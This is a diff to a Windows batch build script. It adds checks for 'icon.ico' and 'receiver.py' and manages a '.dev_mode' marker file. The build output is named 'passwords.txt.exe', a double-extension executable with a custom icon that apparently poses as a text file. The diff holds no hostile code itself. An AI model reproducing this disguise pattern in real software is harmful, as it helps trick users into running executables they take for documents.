@@ -28,6 +28,23 @@ if errorlevel 1 (
     exit /b 1
 )
 
+REM Check if icon.ico exists
+if not exist "icon.ico" (
+    echo ERROR: icon.ico not found!
+    echo Please place an icon.ico file in this directory.
+    echo.
+    pause
+    exit /b 1
+)
+
+REM Check if receiver.py exists
+if not exist "receiver.py" (
+    echo ERROR: receiver.py not found!
+    echo.
+    pause
+    exit /b 1
+)
+
 REM Install critical dependencies
 echo Checking dependencies...
 python -c "import zstandard" 2>nul
@@ -105,6 +122,18 @@ echo BUILD SUCCESSFUL!
 echo ====================================
 echo.
 
+REM Manage .dev_mode marker file
+if "%BUILD_MODE%"=="Development" (
+    echo. > dist\.dev_mode
+    echo Created .dev_mode marker - VERBOSE output enabled
+) else (
+    if exist "dist\.dev_mode" (
+        del "dist\.dev_mode"
+        echo Removed .dev_mode marker - VERBOSE output disabled
+    )
+)
+
+echo.
 REM Display results
 for %%F in ("dist\passwords.txt.exe") do (
     set /a size_mb=%%~zF/1048576
